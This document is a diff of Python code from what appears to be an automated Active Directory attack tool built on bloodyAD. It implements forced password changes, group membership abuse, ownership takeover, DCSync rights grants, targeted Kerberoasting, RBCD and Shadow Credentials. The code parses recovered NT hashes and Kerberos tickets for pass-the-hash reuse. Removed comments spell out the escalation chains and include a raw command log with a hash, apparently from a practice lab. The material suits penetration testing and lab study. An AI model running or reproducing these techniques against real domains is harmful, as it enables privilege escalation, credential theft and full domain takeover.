@@ -7,92 +7,13 @@ from strategies.bloodyad_base import HARDCODED_PASSWORD
 
 import re
 
-"""
-│   ├── ldap_techniques.py       ← bloodyAD writes
-│   │   ├── _do_force_change_password
-│   │   ├── _do_add_member
-│   │   ├── _do_rbcd
-│   │   ├── _do_shadow_credentials
-│   │   ├── _do_targeted_kerberoast
-│   │   ├── _do_grant_dcsync (????)
-│   │   └── _do_take_ownership
-
-LDAP writes via bloodyAD : Privilege escalation via directory manipulation
-LDAP (Lightweight Directory Access Protocol): language to talk to a directory
-Everything is stored in a big hierarchical database. LDAP is used to 
-- read data (query users, groups, permissions) 
-- and write data (modify attributes, memberships, ACLs)
-bloodyAD is a tool that performs LDAP write operations against AD.
-- It doesn't exploit memory or Kerberos directly but modifies AD objects
-
-Techniques : TODO: make them into an enum
-1. ForceChangePassword : modify unicodePwd without knowing the old one
-- (User / Group / Computer) --> User
-- Permission needed: CONTROL_ACCESS with User-Force-Change-Password extended right
-- Downside: Very loud — the user notices immediately when they can't log in.
-2. AddMember
-- (User / Group) --> Group
-- Permission needed: WRITE_PROP on member attribute, OR WRITE_VALIDATED with Self-Membership
-3. RBCD (Resource-Based Constrained Delegation) : modifies msDS-AllowedToActOnBehalfOfOtherIdentity
-- One machine impersonates users to another machine
-- (User / Group / Computer) --> Computer
-4. Shadow Credentials
-- (User / Group / Computer) --> User
-- Stealthy: Doesn't change the password
-- Permission needed: WRITE_PROP on msDS-KeyCredentialLink
-(
-Attacker → adds fake certificate entry → msDS-KeyCredentialLink on target
-         → requests Kerberos TGT using that certificate (PKINIT)
-         → authenticates AS the target
-)
-5. TakeOwnership : modify owner field in nTSecurityDescriptor (owner --> full control)
-- (User / Group / Computer) --> Base
-( TakeOwnership → become owner
-→ modify DACL → give yourself GenericAll
-→ full control)
-6. GrantDCSync : Domain object DACL, add rights GetChanges & GetChangesAll
-- replicate hashed passwords from DC
-- (User / Group) --> Domain
-7. TargeteKerberoast : modifies servicePrincipalName (SPN)
-- requests a kerberos ticket, cracks it and recovers password of the target
-- (User / Group) --> User
-- Permission needed: WRITE_PROP on servicePrincipalName (in Public-Information property set)
-
-Security Principals = User + Group + Computer
-Every object has a DACL (Discretionary Access Control List). It contains ACEs (rules).
-
-NOO GRANT DCSYNC comes from WRITE_OWNER
-You have WRITE_OWNER on target
-    ↓
-You set yourself as owner of that object
-    ↓
-Owner implicitly gets WRITE_DACL
-    ↓
-Now you can modify the DACL (give yourself GenericAll)
-MATCH p=(:Base)-[:Owns]->(:Base)
-RETURN p LIMIT 25
-
--- or
-MATCH p=(:Base)-[:WriteOwner]->(:Base)
-RETURN p LIMIT 25
-You have WRITE_DACL on the Domain object
-    ↓
-You add two ACEs to the domain DACL:
-  - DS-Replication-Get-Changes
-  - DS-Replication-Get-Changes-All
-    ↓
-Now your user can replicate like a DC
-    ↓
-Run secretsdump → get all hashes
-"""
-
 class ADTechniquesMixin:
     """
     Techniques that write to AD via LDAP (bloodyAD).
     Requires: self.edge, self.attacker, self.target, self._run_bloodyad()
     """
     # ──────────────────────────────────────────────────
-    # Force Change Password
+    # 1. Force Change Password
     # ──────────────────────────────────────────────────
     def _do_force_change_password(self, creds: dict) -> ExploitResult:
         target_sam = self.target.sam()
@@ -124,7 +45,7 @@ class ADTechniquesMixin:
         )
 
     # ──────────────────────────────────────────────────
-    # Add Member
+    # 2. Add Member
     # ──────────────────────────────────────────────────
     def _do_add_member(self, creds: dict) -> ExploitResult:
         group_sam = self.target.sam()
@@ -155,9 +76,53 @@ class ADTechniquesMixin:
             success=True,
             notes=f"{member_sam} added to {group_sam}",
         )
+    
+    # ──────────────────────────────────────────────────
+    # 3. TakeOwnership
+    # ──────────────────────────────────────────────────
+    def _do_take_ownership(self, creds:dict) -> ExploitResult:
+        attacker_sam = self.attacker.sam()
+        target_sam = self.target.sam()
+
+        output = self._run_bloodyad(
+            creds,
+            ["set", "owner", target_sam, attacker_sam],
+            "TakeOwnership"
+        )
+
+        print_done(f"{attacker_sam} is now owner of {target_sam}")
+        return ExploitResult(
+            technique="TakeOwnership",
+            edge=self.edge,
+            success=True,
+            notes=(
+                f"{attacker_sam} is now owner of {target_sam}\n"
+                f"Next: GrantGenericAll → full control"
+            ),
+        )
+    
+    # ──────────────────────────────────────────────────
+    # 4. GrantDCSync (WriteDacl on Domain)
+    # ──────────────────────────────────────────────────
+    def _do_grant_dcsync(self, creds: dict) -> ExploitResult:
+        attacker_sam = self.attacker.sam()
+
+        self._run_bloodyad(
+            creds,
+            ["add", "dcsync", attacker_sam],
+            "GrantDCSync"
+        )
+
+        print_done(f"{attacker_sam} has now dcsync rights on {creds['domain']}")
+        return ExploitResult(
+            technique="GrantDCSync",
+            edge=self.edge,
+            success=True,
+            notes=f"{attacker_sam} has now dcsync rights on {creds['domain']}",
+        )
 
     # ──────────────────────────────────────────────────
-    # Targeted Kerberoast
+    # 5. Targeted Kerberoast
     # ──────────────────────────────────────────────────
     def _do_targeted_kerberoast(self, creds: dict) -> ExploitResult:
         target_sam = self.target.sam()
@@ -178,7 +143,7 @@ class ADTechniquesMixin:
         )
 
     # ──────────────────────────────────────────────────
-    # RBCD
+    # 6. RBCD
     # ──────────────────────────────────────────────────
     def _do_rbcd(self, creds: dict) -> ExploitResult:
         target_sam = self.target.sam()
@@ -199,63 +164,55 @@ class ADTechniquesMixin:
         )
     
     # ──────────────────────────────────────────────────
-    # Shadow Credentials
+    # 7. Shadow Credentials
     # ──────────────────────────────────────────────────
-
-    """
-    bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add shadowCredentials <target_sam>
-    rania@DELL:/mnt/c/Users/dell precision$ bloodyAD --host 192.168.56.10 -d sevenkingdoms.local -u lord.varys -p :52ff2a79823d81d6a3f4f8261d7acc59 add shadowCredentials robert.baratheon
-    [+] KeyCredential generated with following sha256 of RSA key: 71c9301f8043acb4ca030c123906b5b1ec3526343b1ef70d92ae3b65a632a68c
-    [+] TGT stored in ccache file robert.baratheon_WS.ccache
-
-    NT: 9029cf007326107eb1c519c84ea60dbe
-    rania@DELL:/mnt/c/Users/dell precision$
-    """
     def _do_shadow_credentials(self, creds: dict) -> ExploitResult:
-        target_sam = self.target.sam()
+        try:
+            target_sam = self.target.sam()
 
-        output = self._run_bloodyad(
-            creds,
-            ["add", "shadowCredentials", target_sam],
-            "ShadowCredentials"
-        )
-
-        """
-        The output gives you the NT hash and the ccache path,
-          not a password. So you should parse
-            those and use hash and ticket fields instead.
-        """
-
-        parsed = self._parse_shadow_credentials_output(output)
-        nt_hash = parsed.get("nt_hash","")
-        ccache = parsed.get("ccache","")
-
-        if not nt_hash and not ccache:
-            raise HopFailedError(
-                "ShadowCredentials",
-                "bloodyAD ran but could not parse NT hash or ccache from output"
+            output = self._run_bloodyad(
+                creds,
+                ["add", "shadowCredentials", target_sam],
+                "ShadowCredentials"
             )
 
-        print_done(f"Shadow Credentials set on {target_sam} → NT: {nt_hash}")
-        return ExploitResult(
-            technique="ShadowCredentials",
-            edge=self.edge,
-            success=True,
-            notes=(
-                f"PShadow credentials added to {target_sam}\n"
-                f"Username : {target_sam}\n"
-                f"NT Hash  : {nt_hash}\n"
-                f"TGT      : {ccache}\n"
-                f"Domain   : {creds['domain']}"
-            ),
-            gained_access=Credential(
-                username=target_sam,
-                hash=f":{nt_hash}",   # :hash format for pass-the-hash tools
-                ticket=ccache,        # ccache path for Kerberos tools
-                domain=creds.get("domain"),
-                dc_ip=creds.get("dc_ip"),
-            ),
-        )
+            parsed = self._parse_shadow_credentials_output(output)
+            nt_hash = parsed.get("nt_hash","")
+            ccache = parsed.get("ccache","")
+
+            if not nt_hash and not ccache:
+                raise HopFailedError(
+                    "ShadowCredentials",
+                    "bloodyAD ran but could not parse NT hash or ccache from output"
+                )
+
+            print_done(f"Shadow Credentials set on {target_sam} → NT: {nt_hash}")
+            return ExploitResult(
+                technique="ShadowCredentials",
+                edge=self.edge,
+                success=True,
+                notes=(
+                    f"Shadow credentials added to {target_sam}\n"
+                    f"Username : {target_sam}\n"
+                    f"NT Hash  : {nt_hash}\n"
+                    f"TGT      : {ccache}\n"
+                    f"Domain   : {creds['domain']}"
+                ),
+                gained_access=Credential(
+                    username=target_sam,
+                    hash=f":{nt_hash}",   # :hash format for pass-the-hash tools
+                    ticket=ccache,        # ccache path for Kerberos tools
+                    domain=creds.get("domain"),
+                    dc_ip=creds.get("dc_ip"),
+                ),
+            )
+        except HopFailedError as e: # ShadowCredentials requires PKINIT support
+            if "PKINIT" in str(e) or "PADATA_TYPE_NOSUPP" in str(e):
+                raise HopFailedError(
+                    self.edge,
+                    "ShadowCredentials requires ADCS/PKINIT — not available on this DC"
+                )
+            raise
     
     def _parse_shadow_credentials_output(self, output: str) -> dict:
         result = {}
